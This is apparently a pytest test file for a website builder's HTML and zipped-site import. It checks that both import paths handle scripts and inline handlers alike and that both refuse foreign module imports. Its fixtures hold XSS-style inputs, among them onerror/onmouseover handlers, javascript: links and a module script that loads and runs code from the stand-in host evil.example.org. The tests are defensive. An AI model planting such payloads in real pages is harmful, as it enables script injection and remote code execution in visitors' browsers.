import pytest

from site_zips import zip_of

DOCUMENTS = {
    "inline_handlers": '<html><head><title>H</title></head><body><button onclick="alert(1)">Go</button><img src="https://example.org/a.png" onerror="alert(2)" alt=""><div onmouseover=\'steal()\'>x</div></body></html>',
    "external_then_inline_script": '<html><head><title>E</title><script src="https://cdn.example.org/lib.js"></script></head><body><p>e</p><script>window.inline = 1;</script></body></html>',
    "json_ld_before_the_script": '<html><head><title>J</title><script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"J"}</script></head><body><p>j</p><script>window.real = 1;</script></body></html>',
    "json_ld_alone": '<html><head><title>L</title><script type="application/ld+json">{"@context":"https://schema.org","@type":"Thing"}</script></head><body><p>l</p></body></html>',
    "a_javascript_link": '<html><head><title>K</title></head><body><a href="javascript:alert(1)">k</a><form action="javascript:void(0)"><input></form></body></html>',
    "a_module_script": '<html><head><title>M</title></head><body><p>m</p><script type="module">const a = 1; window.mod = a;</script></body></html>',
}
FOREIGN_IMPORT = '<html><head><title>I</title></head><body><p>i</p><script type="module">import x from "https://evil.example.org/x.js"; x();</script></body></html>'
CASES = list(DOCUMENTS)


@pytest.fixture()
def blank(client):
    r = client.post("/api/new", json={"name": "Blank", "blank": True})
    assert r.status_code == 200, r.text
    return r.json()


def section_after(client, root_id):
    site = client.get("/api/state").json()["site"]
    value = site["extensions"]["code"]["sections"][root_id]
    return {key: value[key] for key in ("html", "css", "js", "module")}


def through_import_html(client, document):
    r = client.post("/api/library/import-html", json={"html": document})
    if r.status_code != 200:
        return ("refused", r.status_code)
    return section_after(client, r.json()["root"])


def through_site_import(client, document):
    data = zip_of({"index.html": document})
    review = client.post("/api/library/import-site/review", content=data)
    if review.status_code != 200:
        return ("refused", review.status_code)
    pages = review.json()["pages"]
    if not pages:
        return ("refused", 400)
    r = client.post(f"/api/library/import-site?mode=new&revision={review.json()['revision']}", content=data)
    if r.status_code != 200:
        return ("refused", r.status_code)
    if not r.json()["pages"]:
        return ("refused", 400)
    site = client.get("/api/state").json()["site"]
    page = next(p for p in site["pages"] if p["id"] == r.json()["pages"][0])
    sections = site["extensions"]["code"]["sections"]
    held = [c for c in site["nodes"][page["root"]]["children"] if c in sections]
    return section_after(client, held[0])


def test_a_script_that_brings_in_a_foreign_module_never_arrives_by_either_path_and_both_say_why(client, blank):
    single = client.post("/api/library/import-html", json={"html": FOREIGN_IMPORT})
    assert single.status_code == 400
    reason = single.json()["detail"]
    data = zip_of({"index.html": FOREIGN_IMPORT})
    review = client.post("/api/library/import-site/review", content=data).json()
    assert any(reason in w for w in review["pages"][0]["warnings"])
    r = client.post(f"/api/library/import-site?mode=new&revision={review['revision']}", content=data).json()
    site = client.get("/api/state").json()["site"]
    assert "evil.example.org" not in str(site["extensions"]["code"]["sections"])
    assert any(reason in w for w in r["warnings"])


@pytest.mark.parametrize("case", CASES)
def test_single_page_import_and_site_import_treat_scripts_and_handlers_the_same(client, blank, case):
    single = through_import_html(client, DOCUMENTS[case])
    client.post("/api/new", json={"name": "Blank", "blank": True})
    whole = through_site_import(client, DOCUMENTS[case])
    assert isinstance(single, dict) and isinstance(whole, dict), (single, whole)
    assert whole == single
